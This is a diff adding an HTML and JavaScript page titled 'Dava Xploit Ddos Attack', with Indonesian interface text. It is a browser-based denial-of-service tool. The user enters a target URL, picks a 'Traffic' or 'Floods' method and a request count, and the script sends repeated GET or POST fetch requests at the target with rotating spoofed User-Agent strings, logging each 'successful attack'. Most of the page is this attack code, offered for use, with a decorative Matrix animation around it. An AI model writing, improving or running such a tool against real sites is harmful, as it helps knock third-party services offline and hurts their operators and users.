@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>💥Dava Xploit Ddos Attack 🗡 - Moving CMatrix Style (No Zoom)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: monospace;
+            overflow: hidden;
+        }
+
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .matrix-column {
+            position: absolute;
+            top: -20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        h1,
+        form,
+        #hasil {
+            position: relative;
+            z-index: 1;
+        }
+
+        #start,
+        #stop {
+            margin-right: 10px;
+        }
+
+        #hasil {
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #00ff00;
+            padding: 5px;
+        }
+
+        .dropdown {
+            position: relative;
+            display: inline-block;
+        }
+
+        .dropdown-button {
+            background-color: transparent;
+            /* Menghapus warna hijau */
+            border: 1px solid #00ff00;
+            /* Menambahkan border hijau agar tetap terlihat */
+            color: #00ff00;
+            /* Warna teks hijau */
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #f9f9f9;
+            min-width: 160px;
+            box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
+            z-index: 1;
+        }
+
+        .dropdown-content button {
+            color: black;
+            padding: 12px 16px;
+            text-decoration: none;
+            display: block;
+            border: none;
+            background-color: transparent;
+            cursor: pointer;
+            width: 100%;
+            text-align: left;
+        }
+
+        .dropdown-content button:hover {
+            background-color: #ddd;
+        }
+
+        .dropdown:hover .dropdown-content {
+            display: block;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="matrix"></div>
+    <h1>💥Dava Xploit Ddos Attack 🗡</h1>
+    <form>
+        <label for="url">URL:</label>
+        <input id="url" type="text" value="https://" /><br><br>
+        <label>Metode:</label><br>
+        <div class="dropdown">
+            <button type="button" class="dropdown-button">Select Method</button>
+            <div class="dropdown-content">
+                <button type="button" data-method="traffic">Traffic</button>
+                <button type="button" data-method="floods">Floods</button>
+            </div>
+        </div><br><br>
+
+        <div id="traffic-options" style="display: none;">
+            <h3>Opsi Traffic:</h3>
+            <label for="traffic-type">Tipe Traffic:</label>
+            <select id="traffic-type">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+                <!-- Tambahkan opsi lain sesuai kebutuhan -->
+            </select><br><br>
+            <label for="traffic-payload">Payload (untuk POST):</label>
+            <input type="text" id="traffic-payload" value="" placeholder="Otomatis jika dibiarkan kosong"><br><br>
+            <label for="auto-payload">Otomatis Generate Payload:</label>
+            <input type="checkbox" id="auto-payload"><br><br>
+            <label for="random-user-agent">Random User-Agent:</label>
+            <input type="checkbox" id="random-user-agent" checked><br><br>
+        </div>
+
+        <div id="floods-options" style="display: none;">
+            <h3>Opsi Floods:</h3>
+            <label for="flood-type">Tipe Flood:</label>
+            <select id="flood-type">
+                <option value="TCP">TCP Flood</option>
+                <option value="UDP">UDP Flood</option>
+                <option value="HTTP">HTTP Flood</option>
+                <!-- Tambahkan opsi lain sesuai kebutuhan -->
+            </select><br><br>
+            <label for="flood-threads">Jumlah Thread:</label>
+            <input type="number" id="flood-threads" value="10"><br><br>
+        </div>
+
+        <label for="jumlahRequest">Jumlah Request:</label>
+        <input id="jumlahRequest" type="number" value="1000"><br><br>
+        <label for="interval">Interval (ms):</label>
+        <input id="interval" type="number" value="0"><br><br>
+        <button id="start" type="button">Start</button>
+        <button id="stop" type="button">Stop</button><br><br>
+    </form>
+    <div id="hasil"></div>
+
+    <script>
+        const urlInput = document.getElementById('url');
+        const jumlahRequestInput = document.getElementById('jumlahRequest');
+        const intervalInput = document.getElementById('interval');
+        const startBtn = document.getElementById('start');
+        const stopBtn = document.getElementById('stop');
+        const hasilDiv = document.getElementById('hasil');
+        const matrixDiv = document.getElementById('matrix');
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const fontSize = 16;
+        let columns;
+        let requestQueue = [];
+        let isRunning = false;
+        let logBuffer = [];
+        let selectedMethod = '';
+        const trafficOptions = document.getElementById('traffic-options');
+        const floodsOptions = document.getElementById('floods-options');
+        const dropdownContent = document.querySelector('.dropdown-content');
+        const autoPayloadCheckbox = document.getElementById('auto-payload');
+        const trafficPayloadInput = document.getElementById('traffic-payload');
+        const dropdownButton = document.querySelector('.dropdown-button');
+        const randomUserAgentCheckbox = document.getElementById('random-user-agent');
+
+        const userAgents = [
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+"Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+"Mozilla/5.0 (X11; CrOS x86_64 14268.79.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4227.31",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Vivaldi/4.3.2439.56",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Brave/96.1.34.81",
+"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.41",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.41"
+];
+
+        function generateRandomString(length) {
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Fungsi untuk mendapatkan User-Agent acak
+        function getRandomUserAgent() {
+            return userAgents[Math.floor(Math.random() * userAgents.length)];
+        }
+
+        const initMatrix = () => {
+            columns = Math.floor(window.innerWidth / fontSize / 2);
+            matrixDiv.innerHTML = '';
+            for (let i = 0; i < columns; i++) {
+                const column = document.createElement('div');
+                column.classList.add('matrix-column');
+                column.style.left = `${i * fontSize * 2}px`;
+                column.style.top = `-${Math.floor(Math.random() * 50) + 20}px`;
+                column.dataset.speed = Math.random() * 3 + 3;
+                matrixDiv.appendChild(column);
+                for (let j = 0; j < Math.floor(Math.random() * 15) + 5; j++) {
+                    const charSpan = document.createElement('span');
+                    charSpan.textContent = characters[Math.floor(Math.random() * characters.length)];
+                    column.appendChild(charSpan);
+                }
+            }
+        };
+
+        const animateMatrix = () => {
+            const columns = document.querySelectorAll('.matrix-column');
+            columns.forEach(column => {
+                let top = column.offsetTop;
+                const speed = parseFloat(column.dataset.speed);
+                top += speed;
+                column.style.top = `${top}px`;
+                if (top > window.innerHeight) {
+                    column.style.top = `-${Math.floor(Math.random() * 50) + 20}px`;
+                    column.innerHTML = '';
+                    for (let j = 0; j < Math.floor(Math.random() * 15) + 5; j++) {
+                        const charSpan = document.createElement('span');
+                        charSpan.textContent = characters[Math.floor(Math.random() * characters.length)];
+                        column.appendChild(charSpan);
+                    }
+                }
+            });
+            requestAnimationFrame(animateMatrix);
+        };
+
+        initMatrix();
+        animateMatrix();
+        window.addEventListener('resize', initMatrix);
+
+        const timeout = (ms, promise) => {
+            return new Promise((resolve, reject) => {
+                setTimeout(() => {
+                    reject(new Error("Timeout превышен"))
+                }, ms)
+                promise.then(resolve, reject)
+            })
+        }
+
+        const enqueueLog = (message) => {
+            logBuffer.push(message);
+            updateLogDisplay()
+        };
+
+        const updateLogDisplay = () => {
+            if (logBuffer.length > 0) {
+                hasilDiv.innerHTML += logBuffer.join('');
+                logBuffer = [];
+                hasilDiv.scrollTop = hasilDiv.scrollHeight;
+            }
+        };
+
+        setInterval(updateLogDisplay, 350);
+
+        dropdownContent.addEventListener('click', (event) => {
+            if (event.target.tagName === 'BUTTON') {
+                event.preventDefault();
+                selectedMethod = event.target.dataset.method;
+                dropdownButton.textContent = event.target.textContent;
+                trafficOptions.style.display = selectedMethod === 'traffic' ? 'block' : 'none';
+                floodsOptions.style.display = selectedMethod === 'floods' ? 'block' : 'none';
+                startBtn.focus();
+            }
+        });
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        const processQueue = async () => {
+            if (!isRunning) {
+                console.log("processQueue dihentikan.");
+                return;
+            }
+            if (requestQueue.length === 0) {
+                isRunning = false;
+                console.log("requestQueue kosong, processQueue dihentikan.");
+                return;
+            }
+
+            const i = requestQueue.shift();
+            const url = urlInput.value;
+            const interval = parseInt(intervalInput.value);
+            let maxRetries = 3;
+            let retries = 0;
+
+            try {
+                let requestOptions = {
+                    mode: 'no-cors',
+                    headers: {}
+                };
+
+                if (randomUserAgentCheckbox.checked) {
+                    requestOptions.headers['User-Agent'] = getRandomUserAgent();
+                }
+
+                if (selectedMethod === 'floods') {
+                    const floodType = document.getElementById('flood-type').value;
+                    if (floodType === 'HTTP') {
+                        const trafficType = document.getElementById('traffic-type').value;
+                        let trafficPayload = trafficPayloadInput.value;
+
+                        if (autoPayloadCheckbox.checked && !trafficPayload) {
+                            trafficPayload = generateRandomString(20);
+                            trafficPayloadInput.value = trafficPayload;
+                        }
+
+                        requestOptions.method = trafficType;
+                        if (trafficType === 'POST') {
+                            requestOptions.body = trafficPayload;
+                        }
+                    }
+
+                    while (retries < maxRetries) {
+                        try {
+                            const response = await fetch(url, requestOptions);
+
+                            if (response) {
+                                logBuffer.push(`Request ${i + 1} berhasil dikirim (${floodType} Flood).<br>`);
+                                console.log(`%cSuccessfully Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: green;');
+                                break;
+                            }
+                        } catch (error) {
+                            retries++;
+                            logBuffer.push(`Request ${i + 1} gagal (${floodType} Flood, percobaan ${retries}/${maxRetries}): ${error.message}<br>`);
+                            console.error(`Request ${i + 1} gagal (percobaan ${retries}/${maxRetries}):`, error);
+                            console.log(`%cFailed to Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: red;');
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+
+                    if (retries === maxRetries) {
+                        logBuffer.push(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.<br>`);
+                        console.warn(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.`);
+                    }
+
+                } else if (selectedMethod === 'traffic') {
+                    const trafficType = document.getElementById('traffic-type').value;
+                    let trafficPayload = trafficPayloadInput.value;
+
+                    if (autoPayloadCheckbox.checked && !trafficPayload) {
+                        trafficPayload = generateRandomString(20);
+                        trafficPayloadInput.value = trafficPayload;
+                    }
+                    requestOptions.method = trafficType;
+                    if (trafficType === 'POST') {
+                        requestOptions.body = trafficPayload;
+                    }
+
+                    while (retries < maxRetries) {
+                        try {
+                            const response = await fetch(url, requestOptions);
+
+                            if (response) {
+                                logBuffer.push(`Request ${i + 1} berhasil dikirim (${trafficType}).<br>`);
+                                console.log(`%cSuccessfully Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: green;');
+                                break;
+                            }
+                        } catch (error) {
+                            retries++;
+                            logBuffer.push(`Request ${i + 1} gagal (${trafficType}, percobaan ${retries}/${maxRetries}): ${error.message}<br>`);
+                            console.error(`Request ${i + 1} gagal (percobaan ${retries}/${maxRetries}):`, error);
+                            console.log(`%cFailed to Attack Website ${i + 1}/${jumlahRequestInput.value}`, 'color: red;');
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+
+                    if (retries === maxRetries) {
+                        logBuffer.push(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.<br>`);
+                        console.warn(`Request ${i + 1} gagal setelah ${maxRetries} percobaan.`);
+                    }
+                }
+
+            } catch (error) {
+                logBuffer.push(`Terjadi kesalahan: ${error.message}<br>`);
+                console.error("Terjadi kesalahan:", error);
+            }
+
+            if (isRunning) {
+                await delay(interval);
+                processQueue();
+            }
+        };
+
+        startBtn.addEventListener('click', () => {
+            if (isRunning) {
+                return;
+            }
+
+            if (!selectedMethod) {
+                hasilDiv.innerHTML = 'Pilih metode serangan terlebih dahulu.';
+                console.error('Pilih metode serangan terlebih dahulu.');
+                return;
+            }
+
+            const url = urlInput.value;
+            const urlRegex = new RegExp(/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/);
+            if (!urlRegex.test(url)) {
+                hasilDiv.innerHTML = 'URL tidak valid.';
+                console.error('URL tidak valid.');
+                return;
+            }
+
+            hasilDiv.innerHTML = '';
+            requestQueue = [];
+            logBuffer = [];
+
+            const jumlahRequest = parseInt(jumlahRequestInput.value, 10);
+            for (let i = 0; i < jumlahRequest; i++) {
+                requestQueue.push(i);
+            }
+
+            isRunning = true;
+            processQueue();
+        });
+
+        stopBtn.addEventListener('click', () => {
+            isRunning = false;
+            console.log("Tombol Stop ditekan, isRunning diatur ke false.");
+            hasilDiv.innerHTML += 'Serangan sudah dihentikan. .<br>';
+        });
+    </script>
+</body>
+
+</html>
